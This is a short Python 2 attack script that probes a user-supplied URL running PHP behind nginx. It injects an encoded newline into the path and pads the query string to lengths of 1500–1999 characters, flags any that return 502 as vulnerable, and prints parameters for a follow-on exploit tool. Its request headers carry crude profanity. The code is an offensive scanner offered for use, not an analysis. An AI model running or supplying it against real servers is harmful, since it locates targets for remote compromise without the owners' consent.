#!/usr/bin/python
import requests,json
import time
now = int(round(time.time()*1000))
now_time = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(now/1000))
def check_version(url):
    headers = {
    'User-Agent': 'Mozilla/5.0',
    'D-Pisos': '8=D',
    'Ebut': 'mamku tvoyu'
    }
    r = requests.get(url, headers=headers)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'PHP' in response_str and 'nginx' in response_str:
        print
        print 'Server= ' + r.headers.get('Server')
        print 'X-Powered-By= ' + r.headers.get('X-Powered-By')
        print '\n%s Base status code is 200' % now_time
        check_vuln(url)
    else:
        print response_str
def check_vuln(url):
    for i in range(1500,2000):
        url_dir = '/PHP%0Ais_the_shittiest_lang.php?' + 'Q' * i
        vuln_url = url + url_dir
        headers = {
        'User-Agent': 'Mozilla/5.0',
        'D-Pisos': '8=D',
        'Ebut': 'mamku tvoyu'
        }
        r = requests.get(vuln_url, headers=headers)
        if r.status_code == 502:
            print vuln_url
            print '%s Status code 502 for qsl=%s, adding as a candidate' % (now_time,str(i))
            print '%s The target is probably vulnerable. Possible QSLs: [ %s ] ' % (now_time, str(i))
            # print '%s Attack params found: --qsl %s --pisos 165 --skip-detect' % (now_time, str(i))
            print
if __name__ == '__main__':
    # url = 'http://10.10.20.100:8080/index.php'
    url = raw_input("url= ")
    check_version(url)
